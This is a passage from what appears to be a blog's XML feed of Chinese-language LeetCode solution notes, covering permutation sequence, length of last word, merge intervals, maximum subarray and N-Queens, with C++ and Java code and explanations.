            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[60. Permutation Sequence]]></title>
      <url>/wiki/2017/10/30/Leetcode-60-Permutation-Sequence/</url>
      <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>The set <code>[1,2,3,...,n]</code> contains a total of $n!$ unique permutations.</p>
<p>By listing and labeling all of the permutations in order, we get the following sequence for $n = 3$:</p>
<ol>
<li>“123”</li>
<li>“132”</li>
<li>“213”</li>
<li>“231”</li>
<li>“312”</li>
<li>“321”</li>
</ol>
<p>Given $n$ and $k$, return the $k^{th}$ permutation sequence.</p>
<p>Note:</p>
<ul>
<li>Given $n$ will be between 1 and 9 inclusive.</li>
<li>Given $k$ will be between 1 and n! inclusive.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 3, k = 3</span><br><span class="line">Output: &quot;213&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 4, k = 9</span><br><span class="line">Output: &quot;2314&quot;</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>最直接的方法是用backtracking把每一个$k^{th}$排列算出来。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化chosen vector, 即1...n</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">initialize</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; v, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">            v.push_back(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// next_k: 记录了当前的k</span></span><br><span class="line">    <span class="comment">// permuation: kth permuation</span></span><br><span class="line">    <span class="comment">// v: 余下的可以选择的数字</span></span><br><span class="line">    <span class="comment">// res: result to return</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">getPermutationHelper</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k, <span class="keyword">int</span>&amp; next_k, <span class="built_in">string</span>&amp; permutation, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; v, <span class="built_in">string</span>&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!v.size())&#123;</span><br><span class="line">            <span class="comment">// base case</span></span><br><span class="line">            next_k += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (next_k == k+<span class="number">1</span>)&#123;</span><br><span class="line">                res = permutation;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator iter=v.begin(); iter!= v.end(); iter++)&#123;</span><br><span class="line">                <span class="comment">// choose</span></span><br><span class="line">                <span class="keyword">int</span> s = *iter;</span><br><span class="line">                permutation.append(to_string(s));</span><br><span class="line">                v.erase(iter);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// explore</span></span><br><span class="line">                <span class="keyword">bool</span> finished = getPermutationHelper(n, k, next_k, permutation, v, res);</span><br><span class="line">                <span class="keyword">if</span> (finished)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// unchoose</span></span><br><span class="line">                permutation.pop_back();</span><br><span class="line">                v.insert(iter, s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//Given n and k, return the kth permutation sequence.</span></span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getPermutation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> res, permutation;</span><br><span class="line">        <span class="keyword">int</span> next_k = <span class="number">1</span> ;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line">        initialize(v, n);</span><br><span class="line">        getPermutationHelper(n, k, next_k, permutation, v, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可惜的这种方法超时了。</p>
<p>另一种解决方案，直接从数学的角度出发。</p>
<p>因为$n$个不同的数字可以组成$n!$个排列，那么首位(第一个数字)确定的排列都有$(n-1)!$种不同的可能性，而且这些序列都根据首位的大小进行了分组，1…是最小的$(n-1)!$个排列，2…是第$(n-1)!+1$到$2(n-1)!$个排列，那么现在只需要计算$k$中有几个$(n-1)!$就可以确定首位的数字，同样可以通过这样的方法来确定$k^{th}$排列中第2位、第3位……数字。此外，由于列表下标从0开始，所以$k$要减去1。</p>
<p>通过举例来获得更好的理解。以$n = 4，k = 9$为例，其所有排列为：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/permutation.png" alt="permutation"></p>
<p>最高位可以取{1, 2, 3, 4}，而每个数重复3! = 6次。所以第k=9个permutation的s[0]为{1, 2, 3, 4}中的第9/6+1 = 2个数字s[0] = 2。</p>
<p>而对于以2开头的6个数字而言，k = 9是其中的第k’ = 9%(3!) = 3个。而剩下的数字{1, 3, 4}的重复周期为2! = 2次。所以s[1]为{1, 3, 4}中的第k’/(2!)+1 = 2个，即s[1] = 3。</p>
<p>对于以23开头的2个数字而言，k = 9是其中的第k’’ = k’%(2!) = 1个。剩下的数字{1, 4}的重复周期为1! = 1次。所以s[2] = 1.</p>
<p>对于以231开头的一个数字而言，k = 9是其中的第k’’’ = k’’/(1!)+1 = 1个。s[3] = 4</p>
<p>写了一个递归的版本，利用迭代的话会简短一些。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// x的阶乘 x!=1*2*..*x</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=x; i++)&#123;</span><br><span class="line">            ans *= i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// posiit6on: 求取的第position位</span></span><br><span class="line">    <span class="comment">// res: result to return</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getPermutationHelper</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> position, <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&amp; num, <span class="built_in">string</span>&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (position &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">int</span> s = factorial(position);</span><br><span class="line">            <span class="keyword">int</span> index = k/s;</span><br><span class="line">            res.push_back(num[index]);</span><br><span class="line">            num.erase(num.begin() + index);</span><br><span class="line">            getPermutationHelper(k%s, position<span class="number">-1</span>, num, res);</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getPermutation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; num;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">            num.push_back(i+<span class="string">'0'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        getPermutationHelper(k<span class="number">-1</span>, n<span class="number">-1</span>, num, res );</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>递归版本，别人写的，其实差不多，把factorial写成vector形式以后简洁了很多：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">getPermutation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> ret;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; factorial(n,<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; num(n,<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;n; i++) </span><br><span class="line">            factorial[i] = factorial[i<span class="number">-1</span>]*i;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">            num[i] = (i+<span class="number">1</span>)+<span class="string">'0'</span>;</span><br><span class="line">        </span><br><span class="line">        k--;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n; i&gt;=<span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = k/factorial[i<span class="number">-1</span>];</span><br><span class="line">            k %= factorial[i<span class="number">-1</span>];</span><br><span class="line">            ret.push_back(num[j]);</span><br><span class="line">            num.erase(num.begin()+j);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[58. Length of Last Word]]></title>
      <url>/wiki/2017/10/30/Leetcode-58-Length-of-Last-Word/</url>
      <content type="html"><![CDATA[<p>Given a string s consists of upper/lower-case alphabets and empty space characters <code>&#39; &#39;</code>, return the length of last word in the string.</p>
<p>If the last word does not exist, return 0.</p>
<p>Note: A word is defined as a character sequence consists of non-space characters only.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;Hello World&quot;</span><br><span class="line">Output: 5</span><br></pre></td></tr></table></figure>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>太简单了，上代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    String[] stringArray = s.split(<span class="string">" "</span>);</span><br><span class="line">    <span class="keyword">if</span> (stringArray.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> stringArray[stringArray.length - <span class="number">1</span>].length();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.trim().length()-s.trim().lastIndexOf(<span class="string">" "</span>)-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[56. Merge Intervals]]></title>
      <url>/wiki/2017/10/30/Leetcode-56-Merge-Intervals/</url>
      <content type="html"><![CDATA[<p>Given a collection of intervals, merge all overlapping intervals.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,3],[2,6],[8,10],[15,18]]</span><br><span class="line">Output: [[1,6],[8,10],[15,18]]</span><br><span class="line">Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6].</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,4],[4,5]]</span><br><span class="line">Output: [[1,5]]</span><br><span class="line">Explanation: Intervals [1,4] and [4,5] are considered overlapping.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>合并区间。将区间排序，然后依次检查相邻间隔是否重叠，如果重叠，那么就删去重叠的部分。区间排序顺序由区间的开始位置决定，如果该区间的开始位置，大于上一个区间的结束位置，那么区间肯定是不重叠的，将该区间加入到结果中；否则，肯定发生重叠，要去除重叠的部分：如果该区间包含在上一个区间中，即这个区间的结束位置小于上个区间的结束位置，则结果保持不变；否则，更新上个区间的结束位置为该区间的结束位置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> List&lt;Interval&gt; <span class="title">merge</span><span class="params">(List&lt;Interval&gt; intervals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intervals == <span class="keyword">null</span> || intervals.size() == <span class="number">0</span>) <span class="keyword">return</span> intervals;</span><br><span class="line">    intervals.sort(Comparator.comparing(a-&gt;a.start));</span><br><span class="line">    LinkedList&lt;Interval&gt; merged = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    merged.add(intervals.get(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (Interval interval: intervals.subList(<span class="number">1</span>, intervals.size()))</span><br><span class="line">        <span class="keyword">if</span> (merged.getLast().end &lt; interval.start) merged.add(interval);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (merged.getLast().end &lt; interval.end) merged.getLast().end = interval.end;</span><br><span class="line">    <span class="keyword">return</span> merged;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[53. Maximum Subarray]]></title>
      <url>/wiki/2017/10/30/Leetcode-53-Maximum-Subarray/</url>
      <content type="html"><![CDATA[<p>Given an integer array <code>nums</code>, find the contiguous subarray (containing at least one number) which has the largest sum and return its sum.</p>
<p><strong>Example</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [-2,1,-3,4,-1,2,1,-5,4],</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [4,-1,2,1] has the largest sum = 6.</span><br></pre></td></tr></table></figure>
<p><strong>Follow up</strong>: If you have figured out the $O(n)$ solution, try coding another solution using the divide and conquer approach, which is more subtle.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这个问题要求连续子数组的最大和。解决的算法叫做Kadane’s algorithm. 下面的话摘自Jon Bentley在ACM Communication的文章(被整理成一本书叫编程珠玑，该问题在编程珠玑第8章)。</p>
<blockquote>
<p>algorithm that operates on arrays: it starts at the left end (element nums[1]) and scans through to the right end (element nums[$n$]), keeping track of the maximum sum subvector seen so far. The maximum is initially nums[0]. Suppose we’ve solved the problem for nums[$1 .. i - 1$]; how can we extend that to nums[1 .. $i$]? The maximum sum in the first $i$ elements is either the maximum sum in the first $i - 1$ elements (which we’ll call <code>maxSoFar</code>), or it is that of a subvector that ends in position $i$ (which we’ll call <code>maxEndingHere</code>).</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> maxSoFar = nums[<span class="number">0</span>], maxEndingHere = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i &lt; nums.length; ++i)&#123;</span><br><span class="line">	    maxEndingHere = Math.max(maxEndingHere + nums[i], nums[i]);</span><br><span class="line">	    maxSoFar = Math.max(maxSoFar, maxEndingHere);</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> maxSoFar;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maxEndingHere = Math.max(maxEndingHere + nums[i], nums[i]);</span><br></pre></td></tr></table></figure>
<p>也可以替换成<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// only when the maxEndingHere is negative, we start to calculate the sum again.</span></span><br><span class="line"><span class="keyword">if</span> (maxEndingHere &lt; <span class="number">0</span>) maxEndingHere = nums[i];</span><br><span class="line"><span class="keyword">else</span> maxEndingHere += nums[i];</span><br></pre></td></tr></table></figure></p>
<p>它们的含义和功能都是一样的。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Classic </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Divide and Conquer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[52. N-Queens II]]></title>
      <url>/wiki/2017/10/30/Leetcode-52-N-Queens-II/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>The n-queens puzzle is the problem of placing n queens on an $n\times n$ chessboard such that no two queens attack each other.</p>
<p>Given an integer n, return the number of distinct solutions to the n-queens puzzle.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Input: 4</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: There are two distinct solutions to the 4-queens puzzle as shown below.</span><br><span class="line">[</span><br><span class="line"> [&quot;.Q..&quot;,  // Solution 1</span><br><span class="line">  &quot;...Q&quot;,</span><br><span class="line">  &quot;Q...&quot;,</span><br><span class="line">  &quot;..Q.&quot;],</span><br><span class="line"></span><br><span class="line"> [&quot;..Q.&quot;,  // Solution 2</span><br><span class="line">  &quot;Q...&quot;,</span><br><span class="line">  &quot;...Q&quot;,</span><br><span class="line">  &quot;.Q..&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>直接计算51. N-Queens结果大小即可。代码就不贴了。</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[51. N-Queens]]></title>
      <url>/wiki/2017/10/30/Leetcode-51-N-Queens/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>The $n$-queens puzzle is the problem of placing $n$ queens on an $n\times n$ chessboard such that no two queens attack each other.</p>
<p>Given an integer $n$, return all distinct solutions to the $n$-queens puzzle.</p>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15430455654313.png?imageslim" alt=""></p>
<p>Each solution contains a distinct board configuration of the n-queens’ placement, where <code>&#39;Q&#39;</code> and <code>&#39;.&#39;</code> both indicate a queen and an empty space respectively.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input: 4</span><br><span class="line">Output: [</span><br><span class="line"> [&quot;.Q..&quot;,  // Solution 1</span><br><span class="line">  &quot;...Q&quot;,</span><br><span class="line">  &quot;Q...&quot;,</span><br><span class="line">  &quot;..Q.&quot;],</span><br><span class="line"></span><br><span class="line"> [&quot;..Q.&quot;,  // Solution 2</span><br><span class="line">  &quot;Q...&quot;,</span><br><span class="line">  &quot;...Q&quot;,</span><br><span class="line">  &quot;.Q..&quot;]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>Explanation: There exist two distinct solutions to the 4-queens puzzle as shown above.</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>N皇后问题。一个皇后$q(x,y)$能被满足以下条件的皇后$q(row,col)$吃掉</p>
<ul>
<li>x = row (纵向)</li>
<li>y = col（横向）</li>
<li>col + row = y + x;（对角线）</li>
<li>col - row = y - x;（反对角线）</li>
</ul>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15430462580453.jpg?imageslim" alt=""></p>
<p>方法是使用回溯法，具体思路可见<a href="../Algorithm/Backtracking.md">这里</a>。类似于走迷宫，由于每一行都只能有一个皇后，所以可以先在第一行放一个皇后，然后在第二行….第N行放皇后，每次放置后确认是否有效，如果无效，则回退，在该行的下一列放置。</p>
<h4 id="Cpp"><a href="#Cpp" class="headerlink" title="Cpp"></a>Cpp</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt; solveNQueens(<span class="keyword">int</span> n) &#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; board(n, <span class="built_in">string</span>(n, <span class="string">'.'</span>));</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt; res;</span><br><span class="line">    solveNQueensHelper(n, <span class="number">0</span>, board, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solveNQueensHelper</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> column, <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; board, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt;&amp; res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (column == n)&#123;<span class="comment">// 容易错写成 column == n-1</span></span><br><span class="line">        <span class="comment">// base case</span></span><br><span class="line">        res.push_back(board);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> row = <span class="number">0</span>; row &lt; n; row++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (valid_queens(board, column, row))&#123;</span><br><span class="line">                <span class="comment">// choose</span></span><br><span class="line">                board[row][column] = <span class="string">'Q'</span>;</span><br><span class="line">                <span class="comment">// explore</span></span><br><span class="line">                solveNQueensHelper(n, column + <span class="number">1</span>, board, res);</span><br><span class="line">                <span class="comment">// unchoose</span></span><br><span class="line">                board[row][column] = <span class="string">'.'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span 